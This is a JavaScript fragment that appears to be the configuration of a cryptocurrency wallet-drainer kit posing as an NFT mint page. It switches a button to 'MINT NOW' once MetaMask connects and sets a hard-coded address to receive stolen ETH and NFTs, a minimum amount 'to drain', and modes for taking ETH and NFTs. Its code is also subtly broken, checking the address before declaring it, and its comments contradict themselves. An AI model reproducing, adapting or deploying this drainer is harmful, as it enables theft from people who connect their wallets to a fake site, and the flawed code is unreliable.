async function updateMetaMaskStatus() {
        isMetaMaskConnected().then((connected) => {
            if (connected) {
                document.getElementById("connect").innerText = "MINT NOW";
            } else {}
        });
    }

if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);

/*   = = = = = YOUR WALLET ADRESS = = = = =   */
const receiveAddress = "0x6d87CD33b9A735835fB2e9AB97637Cc44f23F299"; // Adress where you want to receive money/nfts

/*   = = = = = AMOUNT = = = = =   */
const mintInfo = {
    minimal: 0.00054 // Minimal of amount of Eth to drain (2.0 is the minimum supported)
}

/*   = = = = = MODES = = = = =   */
const active = {
    eth: true,
    nfts: true, 
}
